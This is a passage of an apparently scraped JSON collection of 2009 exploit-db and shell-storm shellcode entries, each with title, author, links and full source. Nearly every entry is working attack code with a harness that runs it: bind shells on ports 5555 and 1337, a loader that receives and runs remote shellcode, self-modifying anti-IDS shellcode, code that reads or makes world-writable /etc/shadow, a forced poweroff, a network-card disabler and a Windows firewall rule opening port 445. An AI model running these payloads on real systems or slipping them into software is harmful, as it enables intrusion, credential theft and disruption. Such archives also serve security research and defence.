%d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)();", "\t", "\treturn 0;", "}", "", "// milw0rm.com [2009-08-11]"]},
{"Title": "Linux/x86 - Disable Network Card + Polymorphic Shellcode (75 bytes)", "Author": "Jonathan Salwan", "Published": ": 2009-08-26", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13310.c", "View": "https://old.exploit-db.com/raw/13310/", "code": ["/*  Linux x86 - Polymorphic shellcode for disable Network Card (default eth0) - 75 bytes", " *  Jonathan Salwan < submit [!] shell-storm.org >", " *  ", " *\t! DataBase of Shellcodes and you can share your shellcodes : http://www.shell-storm.org/shellcode/ ! ", " *", " *", " * Disassembly of section .text:", " *", " * 08048060 <_start>:", " * 8048060:       6a 0b                   push   $0xb", " * 8048062:       58                      pop    %eax", " * 8048063:       99                      cltd", " * 8048064:       52                      push   %edx", " * 8048065:       68 64 6f 77 6e          push   $0x6e776f64", " * 804806a:       89 e6                   mov    %esp,%esi", " * 804806c:       52                      push   %edx", " * 804806d:       68 65 74 68 30          push   $0x30687465  < (eth0) you can change it for other Network card", " * 8048072:       89 e1                   mov    %esp,%ecx", " * 8048074:       52                      push   %edx", " * 8048075:       68 6e 66 69 67          push   $0x6769666e", " * 804807a:       68 69 66 63 6f          push   $0x6f636669", " * 804807f:       68 69 6e 2f 2f          push   $0x2f2f6e69", " * 8048084:       68 2f 2f 73 62          push   $0x62732f2f", " * 8048089:       89 e3                   mov    %esp,%ebx", " * 804808b:       52                      push   %edx", " * 804808c:       56                      push   %esi", " * 804808d:       51                      push   %ecx", " * 804808e:       53                      push   %ebx", " * 804808f:       89 e1                   mov    %esp,%ecx", " * 8048091:       cd 80                   int    $0x80", " *", " */", "", "main()", "{", "char shellcode[] = \t\"\\xeb\\x11\\x5e\\x31\\xc9\\xb1\\x51\\x80\"", "\t\t\t\"\\x6c\\x0e\\xff\\x01\\x80\\xe9\\x01\\x75\"", "  \t\t\t\"\\xf6\\xeb\\x05\\xe8\\xea\\xff\\xff\\xff\"", "\t\t\t\"\\x6b\\x0c\\x59\\x9a\\x53\\x69\\x65\\x70\"", "\t\t\t\"\\x78\\x6f\\x8a\\xe7\\x53\\x69\\x66\\x75\"", "\t\t\t\"\\x69\\x31\\x8a\\xe2\\x53\\x69\\x6f\\x67\"", "\t\t\t\"\\x6a\\x68\\x69\\x6a\\x67\\x64\\x70\\x69\"", "\t\t\t\"\\x6a\\x6f\\x30\\x30\\x69\\x30\\x30\\x74\"", "\t\t\t\"\\x63\\x8a\\xe4\\x53\\x57\\x52\\x54\\x8a\"", "\t\t\t\"\\xe2\\xce\\x81\";", "", "       \tprintf(\"Length: %d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)();       ", "}", "", "// milw0rm.com [2009-08-26]"]},
{"Title": "Linux/x86 - Bind (/TCP) Listener (5555/TCP) + Receive Shellcode + Payload Loader Shellcode (83 bytes)", "Author": "XenoMuta", "Published": ": 2009-09-09", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-501.php", "View": null, "code": ["/*", "    _  __                 __  ___      __       ", "   | |/ /__  ____  ____  /  |/  /_  __/ /_____ _", "   |   / _ \\/ __ \\/ __ \\/ /|_/ / / / / __/ __ `/", "  /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ / ", " /_/|_\\___/_/ /_/\\____/_/  /_/\\__,_/\\__/\\__,_/  ", "", " xenomuta\\x40phreaker\\x2enet", " http://xenomuta.tuxfamily.org/ - Methylxantina 256mg", "", " Description: ", " linux/x86 listens for shellcode on tcp/5555 and jumps to it", " OS: Linux", " Arch: x86", " Length: 83 bytes", " Author: XenoMuta", "", " greetz to: ", "  str0k3 (tnx for your effort), emra (fragancia),", "  fr1t0l4y (dejate ver), garay (no me olvido de los pobres ;p )", "  - God bless you all -", "*/", ".global _start", "", "_start:", "\txor %ebx, %ebx", "\tmov %ebx, %eax", "", "_socket:", "\tpush $0x6", "\tpush $0x1", "\tpush $0x2", "\tmov $0x66, %al\t", "\tincb %bl", "\tmov %esp, %ecx", "\tint $0x80", "", "_bind:", "\tmov %eax, %edi", "\txor %edx, %edx", "\tpush %edx", "\tpushw $0xb315\t/* 5555 */", "\tpushw %bx", "\tmov %esp, %ecx", "\tpush $0x10", "\tpush %ecx", "\tpush %edi", "\tmov $0x66, %al", "\tincb %bl", "\tmov %esp, %ecx", "\tint $0x80", "", "_listen:", "\tincb %bl", "\tpush $0x1", "\tpush %edi", "\tmov $0x66, %al", "\tincb %bl", "\tmov %esp, %ecx", "\tint $0x80", "", "_accept:", "\tpush %edx", "\tpush %edx", "\tpush %edi", "\tmov $0x66, %al", "\tincb %bl", "\tmov %esp, %ecx", "\tint $0x80", "\tmov %eax, %ebx", "", "_read:", "\tmov $0x3, %al", "\tmov %esp, %ecx", "\tmov $0x7ff, %dx", "\tincb %dl", "\tint $0x80", "\tjmp *%ecx\t/* Jump to our shellcode */", "", "; milw0rm.com [2009-09-09]"]},
{"Title": "Linux/x86 - /bin/sh + Self-Modifying Anti-IDS Shellcode (35/64 bytes)", "Author": "XenoMuta", "Published": ": 2009-09-15", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-505.php", "View": null, "code": ["/*", "    _  __                 __  ___      __", "   | |/ /__  ____  ____  /  |/  /_  __/ /_____ _", "   |   / _ \\/ __ \\/ __ \\/ /|_/ / / / / __/ __ `/", "  /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ /", " /_/|_\\___/_/ /_/\\____/_/  /_/\\__,_/\\__/\\__,_/", "", " xenomuta\\x40phreaker\\x2enet", " http://xenomuta.tuxfamily.org/ - Methylxantina 256mg", "", " Description:", " linux/x86 Self-modifying ShellCode for IDS evasion", " creates int $0x80 syscalls on runtime.", "", " OS: Linux", " Arch: x86", " Length: 64 bytes ( 35 without /bin/sh payload )", " Author: XenoMuta", "", " hola at:", "  str0k3, garay, fr1t0l4y, emra.", "  - God bless you all -", "", "=== SOURCE CODE ====", ".globl _start", "_start:", "\tjmp _findOut\t", "_WhereAmI:", "\tpop %edx\t// Save our payload's address g20", "\tmov %edx, %esi\t// and save it 4 later ", "_loopMakeInt80s:", "\tmov (%edx), %eax", "\tcmpw $0x7dca, %ax\t// Find this guy ( 0x7dca ) and ", "\tjne _no", "\taddw $0x303, %ax\t// 0x7dca + 0x303 == 0x80cd ( int $0x80 )", "\tmov %eax, (%edx)", "_no:", "\tincb %dl", "\tcmp $0x41414141, %eax\t// Use 'AAAA' as end Marker.", "\tjne _loopMakeInt80s\t", "\tjmp *%esi\t\t// Jump to our converted code when done", "_findOut:", "\tcall _WhereAmI", "_payload:\t\t\t// Paste your shell code here and then replace ", "\txor %edx, %edx\t\t// \"\\xcd\\x80\" (int $0x80) for .ascii \"\\xca7d\" ", "\tpush $0xb\t\t// and end with .ascii \"AAAA\" as end marker ", "\tpop %eax", "\tcltd", "\tpush %edx", "\tpush $0x68732f2f", "\tpush $0x6e69622f", "\tmov %esp, %ebx", "\tpush %edx", "\tpush %ebx", "\tmov %esp,%ecx", "\t.ascii \"\\xca\\x7d\" // + 0x303 = 0xcd80 (int $0x80)", "\t.ascii \"AAAA\"", "=== SOURCE CODE ====", "*/", "", "", "char shellcode[] = \"\\xeb\\x1c\\x5a\\x89\\xd6\\x8b\\x02\\x66\\x3d\\xca\\x7d\\x75\\x06\\x66\\x05\\x03\\x03\\x89\\x02\\xfe\\xc2\\x3d\\x41\\x41\\x41\\x41\\x75\\xe9\\xff\\xe6\\xe8\\xdf\\xff\\xff\\xff\\x31\\xd2\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xca\\x7d\\x41\\x41\\x41\\x41\";", "", "int main ()", "{", "\tprintf(\"Length: %d bytes\\n\", strlen(shellcode));", "\tint (*sc)() = (int (*)())shellcode;", "\tsc();", "\treturn 0;", "}", "", "// milw0rm.com [2009-09-15]"]},
{"Title": "Linux/x86 - HTTP Server (8800/TCP) + fork() Shellcode (166 bytes)", "Author": "XenoMuta", "Published": ": 2009-09-15", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-506.php", "View": null, "code": ["/*", "    _  __                 __  ___      __", "   | |/ /__  ____  ____  /  |/  /_  __/ /_____ _", "   |   / _ \\/ __ \\/ __ \\/ /|_/ / / / / __/ __ `/", "  /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ /", " /_/|_\\___/_/ /_/\\____/_/  /_/\\__,_/\\__/\\__,_/", "", " xenomuta\\x40phreaker\\x2enet", " http://xenomuta.tuxfamily.org/ - Methylxantina 256mg", "", " Description:", " a linux/x86 shellcode that forks a HTTP Server on port tcp/8800", "", " OS: Linux", " Arch: x86", " Length: 166 bytes", " Author: XenoMuta", "", " hola at:", "  str0k3, garay, fr1t0l4y, emra.", "  - God bless you all -", " ", "==== SOURCE CODE ====", ".globl _start", "_start:", "\txor %eax, %eax", "\tmov $0x02, %al", "\tint $0x80", "\ttest %eax, %eax", "\tjz socket", "\txor %eax, %eax", "\tincb %al", "\tint $0x80", "txt:", "\tpop %ecx", "\tmovb $27, %dl", "\tint $0x80", "", "close:", "\tmovb $0x6, %al", "\tmov %esi, %ebx", "\tint $0x80", "", "exit:", "\tmov $0x01, %al", "\txor %ebx, %ebx", "\tint $0x80", "", "socketcall:", "\tpop %esi", "\tmov $0x66, %al", "\tincb %bl", "\tmov %esp, %ecx", "\tint $0x80", "\tjmp *%esi", "", "socket:", "\tcltd", "\txor %eax, %eax", "\txor %ebx, %ebx", "\tpush $0x6", "\tpush $0x1", "\tpush $0x2", "\tcall socketcall", "", "bind:", "\tmov %eax, %edi", "\txor %edx, %edx", "\tpush %edx", "\tpushw $0x6022", "\tpushw %bx", "\tmov %esp, %ecx", "\tpush $0x10", "\tpush %ecx", "\tpush %edi", "\tcall socketcall", "", "listen:", "\tinc %bl", "\tpush $0x05", "\tpush %edi", "\tcall socketcall", "", "accept:", "\txor %ecx, %ecx", "\tpush %edx", "\tpush %edx", "\tpush %edi", "\tcall socketcall", "\t", "fork:", "\tmov %eax, %esi", "\txor %eax, %eax", "\tmov $0x02, %al", "\tint $0x80", "\ttest %eax, %eax", "\tjz write", "", "\txor %eax, %eax", "\tmov $0x06, %al", "\tmov %esi, %ebx", "\tint $0x80", "", "\txor %eax, %eax", "\txor %ebx, %ebx", "\tmov $0x04, %bl", "\tjmp accept", "", "write:", "\tmov %esi, %ebx", "\tmov $0x04, %al", "\tcall txt", "\t.string \"HTTP/1.0 200\\r\\n\\r\\n<h1>:)</h1>\"", "==== SOURCE CODE ====", "*/", "char shellcode[] = \"\\x31\\xc0\\xb0\\x02\\xcd\\x80\\x85\\xc0\\x74\\x22\\x31\\xc0\\xfe\\xc0\\xcd\\x80\\x59\\xb2\\x1b\\xcd\\x80\\xb0\\x06\\x89\\xf3\\xcd\\x80\\xb0\\x01\\x31\\xdb\\xcd\\x80\\x5e\\xb0\\x66\\xfe\\xc3\\x89\\xe1\\xcd\\x80\\xff\\xe6\\x99\\x31\\xc0\\x31\\xdb\\x6a\\x06\\x6a\\x01\\x6a\\x02\\xe8\\xe5\\xff\\xff\\xff\\x89\\xc7\\x31\\xd2\\x52\\x66\\x68\\x22\\x60\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\xe8\\xcf\\xff\\xff\\xff\\xfe\\xc3\\x6a\\x05\\x57\\xe8\\xc5\\xff\\xff\\xff\\x31\\xc9\\x52\\x52\\x57\\xe8\\xbb\\xff\\xff\\xff\\x89\\xc6\\x31\\xc0\\xb0\\x02\\xcd\\x80\\x85\\xc0\\x74\\x10\\x31\\xc0\\xb0\\x06\\x89\\xf3\\xcd\\x80\\x31\\xc0\\x31\\xdb\\xb3\\x04\\xeb\\xda\\x89\\xf3\\xb0\\x04\\xe8\\x85\\xff\\xff\\xff\\x48\\x54\\x54\\x50\\x2f\\x31\\x2e\\x30\\x20\\x32\\x30\\x30\\x0d\\x0a\\x0d\\x0a\\x3c\\x68\\x31\\x3e\\x3a\\x29\\x3c\\x2f\\x68\\x31\\x3e\";", "", "int main ()", "{", "\tprintf(\"Length: %d bytes\\n\", strlen(shellcode));", "\tint (*sc)() = (int (*)())shellcode;", "\tsc();", "\treturn 0;", "}", "", "// milw0rm.com [2009-09-15]"]},
{"Title": "Linux/x86 - setuid(0) + execve(/sbin/poweroff -f) Shellcode (47 bytes)", "Author": "ka0x", "Published": ": 2009-12-04", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-558.php", "View": null, "code": ["#include <stdio.h>", "", "/* ", "\tlinux/x86 ; setuid(0) & execve(\"/sbin/poweroff -f\") 47 bytes", "\twritten by ka0x - <ka0x01[alt+64]gmail.com>", "\tlun sep 21 16:40:16 CEST 2009", "", "\tgreets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek, Hendrix and others!", "*/", "", "int main()", "{", "\tchar shellcode[] = ", "\t\t\t\"\\x31\\xdb\"\t\t// xor ebx,ebx", "\t\t\t\"\\x6a\\x17\"\t\t// push byte 0x17", "\t\t\t\"\\x58\"\t\t\t// pop eax", "\t\t\t\"\\xcd\\x80\"\t\t// int 80h", "\t\t\t\"\\x8d\\x43\\x0b\"\t\t// lea eax,[ebx+0xb]", "\t\t\t\"\\x99\"\t\t\t// cdq", "\t\t\t\"\\x52\"\t\t\t// push edx", "\t\t\t\"\\x66\\x68\\x66\\x66\"\t// push word 0x6666", "\t\t\t\"\\x68\\x77\\x65\\x72\\x6f\"\t// push dword 0x6f726577", "\t\t\t\"\\x68\\x6e\\x2f\\x70\\x6f\"\t// push dword 0x6f702f6e", "\t\t\t\"\\x68\\x2f\\x73\\x62\\x69\"\t// push dword 0x6962732f", "\t\t\t\"\\x89\\xe3\"\t\t// mov ebx,esp", "\t\t\t\"\\x52\"\t\t\t// push edx", "\t\t\t\"\\x66\\x68\\x2d\\x66\"\t// push word 0x662d", "\t\t\t\"\\x89\\xe1\"\t\t// mov ecx,esp", "\t\t\t\"\\x52\"\t\t\t// push edx", "\t\t\t\"\\x51\"\t\t\t// push ecx", "\t\t\t\"\\x53\"\t\t\t// push ebx", "\t\t\t\"\\x89\\xe1\"\t\t// mov ecx,esp", "\t\t\t\"\\xcd\\x80\" ;\t\t// int 80h", "", "\tprintf(\"[*] ShellCode size (bytes): %d\\n\\n\", sizeof(shellcode)-1 );", "\t(*(void(*)()) shellcode)();", "\t", "\treturn 0;", "}"]},
{"Title": "Linux/x86 - setuid(0) + /bin/cat /etc/shadow Shellcode (49 bytes)", "Author": "ka0x", "Published": ": 2009-12-04", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-557.php", "View": null, "code": ["#include <stdio.h>", "", "/* ", "\tlinux/x86 ; setuid(0) & execve(/bin/cat /etc/shadow) 49 bytes", "\twritten by ka0x - <ka0x01[alt+64]gmail.com>", "\tlun sep 21 16:40:16 CEST 2009", "", "\tgreets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!", "*/", "", "int main()", "{", "\tchar shellcode[] = ", "\t\t\t\"\\x31\\xdb\"\t\t// xor ebx,ebx", "\t\t\t\"\\x6a\\x17\"\t\t// push byte 17h\t", "\t\t\t\"\\x58\"\t\t\t// pop eax", "\t\t\t\"\\xcd\\x80\"\t\t// int 0x80", "\t\t\t\"\\x8d\\x43\\x0b\"\t\t// lea eax,[ebx+0xb]", "\t\t\t\"\\x99\"\t\t\t// cdq", "\t\t\t\"\\x52\"\t\t\t// push edx", "\t\t\t\"\\x68\\x2f\\x63\\x61\\x74\"\t// push dword 0x7461632f", "\t\t\t\"\\x68\\x2f\\x62\\x69\\x6e\"\t// push dword 0x6e69622f", "\t\t\t\"\\x89\\xe3\"\t\t// mov ebx,esp", "\t\t\t\"\\x52\"\t\t\t// push edx", "\t\t\t\"\\x68\\x61\\x64\\x6f\\x77\"\t// push dword 0x776f6461", "\t\t\t\"\\x68\\x2f\\x2f\\x73\\x68\"\t// push dword 0x68732f2f", "\t\t\t\"\\x68\\x2f\\x65\\x74\\x63\"\t// push dword 0x6374652f", "\t\t\t\"\\x89\\xe1\"\t\t// mov ecx,esp", "\t\t\t\"\\x52\"\t\t\t// push edx", "\t\t\t\"\\x51\"\t\t\t// push ecx", "\t\t\t\"\\x53\"\t\t\t// push ebx", "\t\t\t\"\\x89\\xe1\"\t\t// mov ecx,esp", "\t\t\t\"\\xcd\\x80\" ;\t\t// int 80h", "", "\tprintf(\"[*] ShellCode size (bytes): %d\\n\\n\", sizeof(shellcode)-1 );", "\t(*(void(*)()) shellcode)();", "\t", "\treturn 0;", "}"]},
{"Title": "Linux/x86 - chmod 0666 /etc/shadow + exit() Shellcode (33 bytes)", "Author": "ka0x", "Published": ": 2009-12-04", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-556.php", "View": null, "code": ["#include <stdio.h>", "", "/* ", "\tlinux/x86 ; chmod(/etc/shadow, 0666) & exit() 33 bytes", "\twritten by ka0x - <ka0x01[alt+64]gmail.com>", "\tlun sep 21 17:13:25 CEST 2009", "", "\tgreets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!", "", "*/", "", "int main()", "{", "", "\tchar shellcode[] = ", "\t\t\t\"\\x31\\xc0\"\t\t\t// xor eax,eax", "\t\t\t\"\\x50\"\t\t\t\t// push eax", "\t\t\t\"\\x68\\x61\\x64\\x6f\\x77\"\t\t// push dword 0x776f6461", "\t\t\t\"\\x68\\x2f\\x2f\\x73\\x68\"\t\t// push dword 0x68732f2f", "\t\t\t\"\\x68\\x2f\\x65\\x74\\x63\"\t\t// push dword 0x6374652f", "\t\t\t\"\\x89\\xe3\"\t\t\t// mov ebx,esp", "\t\t\t\"\\x66\\x68\\xb6\\x01\"\t\t// push word 0x1b6", "\t\t\t\"\\x59\"\t\t\t\t// pop ecx", "\t\t\t\"\\xb0\\x0f\"\t\t\t// mov al,0xf", "\t\t\t\"\\xcd\\x80\"\t\t\t// int 0x80", "\t\t\t\"\\xb0\\x01\"\t\t\t// mov al,0x1", "\t\t\t\"\\xcd\\x80\";\t\t\t// int 0x80", "", "\tprintf(\"[*] ShellCode size (bytes): %d\\n\\n\", sizeof(shellcode)-1 );", "\t(*(void(*)()) shellcode)();", "\t", "\treturn 0;", "}"]},
{"Title": "Windows (XP SP2) - PEB ISbeingdebugged Beep Shellcode (56 bytes)", "Author": "anonymous", "Published": ": 2009-12-14", "Platform": "Windows", "Download": "http://shell-storm.org/shellcode/files/shellcode-802.php", "View": null, "code": ["#name: win xp sp2 PEB ISbeingdebugged shellcode", "", "#Author: Anonymous", "", "#Date: 14.12.2009.", "", "here is the ASM code made using masm32", "", "", "if program is being run under debugger the shellcode wil start beeping :D ", "//////////////////////begin///////////////////////////////////////", "", ".386", ".model flat, stdcall", "option casemap :none", "INCLUDE\t C:\\MASM32\\INCLUDE\\WINDOWS.INC", "INCLUDE\t C:\\MASM32\\INCLUDE\\KERNEL32.INC", "INCLUDE\t C:\\MASM32\\INCLUDE\\USER32.INC", "INCLUDE\t C:\\MASM32\\INCLUDE\\MASM32.INC", "INCLUDELIB  C:\\MASM32\\LIB\\KERNEL32.LIB", "INCLUDELIB  C:\\MASM32\\LIB\\USER32.LIB", "INCLUDELIB  C:\\MASM32\\LIB\\MASM32.LIB", "", "", "    .data", "ExitMsg  DB \"Enter to Exit\", 0", "", "  .code", " start:", "assume fs:nothing", "mov eax,fs:[30h]", "mov     eax, [eax+02h]", "mov ebx, 7FFF8000h", "add ebx,7FFF8000h", "inc ebx", "push 300h", "push 200h", "mov edx,7c837a8fh", "cmp eax,ebx", "jnz exit", "call edx", "exit:", "invoke ExitProcess,NULL", "", "", "end start", "", "", "/////////////////////////////end///////////////////////////////", "", "here is the dump of code using olly debugger", "", "", "00401000 >/$ 64:A1 30000000 MOV EAX,DWORD PTR FS:[30]", "00401006  |. 8B40 02        MOV EAX,DWORD PTR DS:[EAX+2]", "00401009  |. BB 0080FF7F    MOV EBX,7FFF8000", "0040100E  |. 81C3 0080FF7F  ADD EBX,7FFF8000", "00401014  |. 43             INC EBX", "00401015  |. 68 00030000    PUSH 300                                 ; /Duration = 768. ms", "0040101A  |. 68 00020000    PUSH 200                                 ; |Frequency = 200 (512.)", "0040101F  |. BA 8F7A837C    MOV EDX,kernel32.Beep                    ; |", "00401024  |. 3BC3           CMP EAX,EBX                              ; |", "00401026  |. 75 02          JNZ SHORT antidebu.0040102A              ; |", "00401028  |. FFD2           CALL EDX                                 ; \\Beep", "0040102A  |> 6A 00          PUSH 0                                   ; /ExitCode = 0", "0040102C  \\. E8 01000000    CALL <JMP.&kernel32.ExitProcess>         ; \\ExitProcess", "00401031     CC             INT3", "00401032   .-FF25 00204000  JMP DWORD PTR DS:[<&kernel32.ExitProcess>;  kernel32.ExitProcess", "", "", "", "", "", "", "here is the shellcode", "\\x64\\xA1\\x30\\x00\\x00\\x00\\x8B\\x40\\x02\\xBB\\x00\\x80\\xFF\\x7F\\x81\\xC3\\x00\\x80\\xFF\\x7F\\x43\\x68\\x00\\x03\\x00\\x00\\x68\\x00\\x02\\x00\\x00\\xBA\\x8F\\x7A\\x83\\x7C\\x3B\\xC3\\x75\\x02\\xFF\\xD2\\x6A\\x00\\xE8\\x01\\x00\\x00\\x00\\xCC\\xFF\\x25\\x00\\x20\\x40\\x00"]},
{"Title": "Windows/x86 (XP SP3) - Add Firewall Rule (Allow 445/TCP) Shellcode", "Author": "sinn3r", "Published": ": 2009-12-24", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-569.php", "View": null, "code": ["; Author: sinn3r (x90.sinner {a.t} gmail.c0m)", "; Tested on Windows XP SP3", "; Description:", "; This shellcode will create a XP firewall rule to allow TCP traffic on port 445.", "; Make sure ADVAPI32.dll is loaded.", "", "[BITS 32]", "", "global _start", "", "_start:", "", ";for the handle", "xor edx, edx", "mov edi, esp", "mov dword [edi], edx", "sub esp, 0x10\t\t;avoid handle being overwritten", "", ";Prepare the key", "push 0x00747369", "push 0x4c5c7374", "push 0x726f506e", "push 0x65704f79", "push 0x6c6c6162", "push 0x6f6c475c", "push 0x656c6966", "push 0x6f725064", "push 0x7261646e", "push 0x6174535c", "push 0x7963696c", "push 0x6f706c6c", "push 0x61776572", "push 0x69465c73", "push 0x72657465", "push 0x6d617261", "push 0x505c7373", "push 0x65636341", "push 0x64657261", "push 0x68535c73", "push 0x65636976", "push 0x7265535c", "push 0x7465536c", "push 0x6f72746e", "push 0x6f43746e", "push 0x65727275", "push 0x435c4d45", "push 0x54535953", "mov edx, esp", "", "xor eax, eax", "push eax\t\t;pDisposion = NULL", "push edi\t\t;pHandle", "push eax\t\t;pSecurity = NULL", "push 0x0f003f\t\t;Access = KEY_ALL_ACCESS", "push eax\t\t;Options = REG_OPTION_NON_VOLATILE", "push eax\t\t;Class = NULL", "push eax\t\t;Reserved = NULL", "push edx\t\t;Subkey", "push 0x80000002\t\t;hkey = HKEY_LOCAL_MACHINE", "mov eax, 0x77DDE9E4\t;RegCreateKeyExA", "call eax", "", ";RegSetValue ValueName = 445:TCP", "push 0x00504354", "push 0x3a353434", "mov edx, esp", "", ";REgSEtValue buffer = 445:TCP:*:Enabled:test", "push 0x00007473", "push 0x65743a64", "push 0x656c6261", "push 0x6e453a2a", "push 0x3a504354", "push 0x3a353434", "mov ecx, esp", "", "xor eax, eax", "inc eax", "push 0x16\t\t;BufSize = 0x16", "push ecx\t\t;Buffer", "push eax\t\t;ValueType = REG-SZ", "dec eax", "push eax\t\t;Reserved = 0", "push edx\t\t;ValueName", "push dword [edi]\t;hKey", "mov eax, 0x77ddead7\t;RegSetValueExA", "call eax", "", "push dword [edi]\t;hKey", "mov eax, 0x77dd6c17\t;RegCloseKey", "call eax", "", ";shellcode:", ";sinn3r@backtrack:~$ nasm -f bin addFirewallRule2.asm -o addFirewallRule2 |cat addFirewallRule2 |hexdump -C |grep -v 000000ff", ";00000000  31 d2 89 e7 89 17 81 ec  10 00 00 00 68 69 73 74  |1...........hist|", ";00000010  00 68 74 73 5c 4c 68 6e  50 6f 72 68 79 4f 70 65  |.hts\\LhnPorhyOpe|", ";00000020  68 62 61 6c 6c 68 5c 47  6c 6f 68 66 69 6c 65 68  |hballh\\Glohfileh|", ";00000030  64 50 72 6f 68 6e 64 61  72 68 5c 53 74 61 68 6c  |dProhndarh\\Stahl|", ";00000040  69 63 79 68 6c 6c 70 6f  68 72 65 77 61 68 73 5c  |icyhllpohrewahs\\|", ";00000050  46 69 68 65 74 65 72 68  61 72 61 6d 68 73 73 5c  |Fiheterharamhss\\|", ";00000060  50 68 41 63 63 65 68 61  72 65 64 68 73 5c 53 68  |PhAcceharedhs\\Sh|", ";00000070  68 76 69 63 65 68 5c 53  65 72 68 6c 53 65 74 68  |hviceh\\SerhlSeth|", ";00000080  6e 74 72 6f 68 6e 74 43  6f 68 75 72 72 65 68 45  |ntrohntCohurrehE|", ";00000090  4d 5c 43 68 53 59 53 54  89 e2 31 c0 50 57 50 68  |M\\ChSYST..1.PWPh|", ";000000a0  3f 00 0f 00 50 50 50 52  68 02 00 00 80 b8 e4 e9  |?...PPPRh.......|", ";000000b0  dd 77 ff d0 68 54 43 50  00 68 34 34 35 3a 89 e2  |.w..hTCP.h445:..|", ";000000c0  68 73 74 00 00 68 64 3a  74 65 68 61 62 6c 65 68  |hst..hd:tehableh|", ";000000d0  2a 3a 45 6e 68 54 43 50  3a 68 34 34 35 3a 89 e1  |*:EnhTCP:h445:..|", ";000000e0  31 c0 40 68 16 00 00 00  51 50 48 50 52 ff 37 b8  |1.@h....QPHPR.7.|", ";000000f0  d7 ea dd 77 ff d0 ff 37  b8 17 6c dd 77 ff d0     |...w...7..l.w..|"]},
{"Title": "FreeBSD/x86 - Bind (1337/TCP) Shell (/bin/sh) Shellcode (167 bytes)", "Author": "sbz", "Published": ": 2009-12-24", "Platform": "FreeBSD_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-570.php", "View": null, "code": ["/*-", " * Copyright (c) 2009, Sofian Brabez <sbz@6dev.net>", " *", " * freebsd-x86-portbind.c - FreeBSD x86 portbind a shell (/bin/sh) on", "1337 (\\x05\\x39) 167 bytes", " */", "", "const char shellcode[] =", "\t\"\\x6a\\x00\" \t\t\t\t\t// push   $0x0", "\t\"\\x6a\\x01\" \t\t\t\t\t// push   $0x1", "\t\"\\x6a\\x02\" \t\t\t\t\t// push   $0x2", "\t\"\\x50\" \t\t\t\t\t\t// push   %eax", "\t\"\\x6a\\x61\" \t\t\t\t\t// push   $0x61", "\t\"\\x58\" \t\t\t\t\t\t// pop    %eax", "\t\"\\xcd\\x80\" \t\t\t\t\t// int    $0x80", "\t\"\\x50\" \t\t\t\t\t\t// push   %eax", "\t\"\\x6a\\x00\" \t\t\t\t\t// push   $0x0", "\t\"\\x6a\\x00\" \t\t\t\t\t// push   $0x0", "\t\"\\x6a\\x00\" \t\t\t\t\t// push   $0x0", "\t\"\\x6a\\x00\" \t\t\t\t\t// push   $0x0", "\t\"\\x68\\x10\\x02\\x05\\x39\" \t\t// push   $0x39050210", "\t\"\\x89\\xe0\" \t\t\t\t\t// mov    %esp,%eax", "\t\"\\x6a\\x10\" \t\t\t\t\t// push   $0x10", "\t\"\\x50\" \t\t\t\t\t\t// push   %eax", "\t\"\\xff\\x74\\x24\\x1c\" \t\t\t// pushl  0x1c(%esp)", "\t\"\\x50\" \t\t\t\t\t\t// push   %eax", "\t\"\\x6a\\x68\" \t\t\t\t\t// push   $0x68", "\t\"\\x58\"\t\t\t\t\t\t// pop    $eax", "\t\"\\xcd\\x80\" \t\t\t\t\t// int    $0x80", "\t\"\\x6a\\x01\"\t\t\t\t\t// push   $0x1", "\t\"\\xff\\x74\\x24\\x28\"\t\t\t// pushl  0x28(%esp)", "\t\"\\x50\"\t\t\t\t\t\t// push   %eax", "\t\"\\x6a\\x6a\"\t\t\t\t\t// push   $0x6a", "\t\"\\x58\"\t\t\t\t\t\t// pop    $eax", "\t\"\\xcd\\x80\"\t\t\t\t\t// int    $0x80", "\t\"\\x83\\xec\\x10\"\t\t\t\t// sub    $0x10,$esp", "\t\"\\x6a\\x10\"\t\t\t\t\t// push   $0x10", "\t\"\\x8d\\x44\\x24\\x04\"         \t// lea    0x4(%esp),%eax", "\t\"\\x89\\xe1\"\t\t\t\t\t// mov    %esp,%ecx", "\t\"\\x51\"\t\t\t\t\t\t// push   %ecx", "\t\"\\x50\"\t\t\t\t\t\t// push   %eax", "\t\"\\xff\\x74\\x24\\x4c\"\t\t\t// pushl  0x4c(%esp)", "\t\"\\x50\"\t\t\t\t\t\t// push   %eax", "\t\"\\x6a\\x1e\"\t\t\t\t\t// push   %0x1e", "\t\"\\x58\"\t\t\t\t\t\t// pop    %eax", "\t\"\\xcd\\x80\"\t\t\t\t\t// int    $0x80", "\t\"\\x50\"\t\t\t\t\t\t// push   %eax", "\t\"\\xff\\x74\\x24\\x58\"\t\t\t// pushl  0x58(%esp)", "\t\"\\x50\"\t\t\t\t\t\t// push   %eax", "\t\"\\x6a\\x06\"\t\t\t\t\t// push   $0x6", "\t\"\\x58\"\t\t\t\t\t\t// pop    %eax", "\t\"\\xcd\\x80\"\t\t\t\t\t// int    $0x80", "\t\"\\x6a\\x00\"\t\t\t\t\t// push   $0x0", "\t\"\\xff\\x74\\x24\\x0c\"\t\t\t// pushl  0xc(%esp)", "\t\"\\x50\"\t\t\t\t\t\t// push   %eax", "\t\"\\x6a\\x5a\"\t\t\t\t\t// push   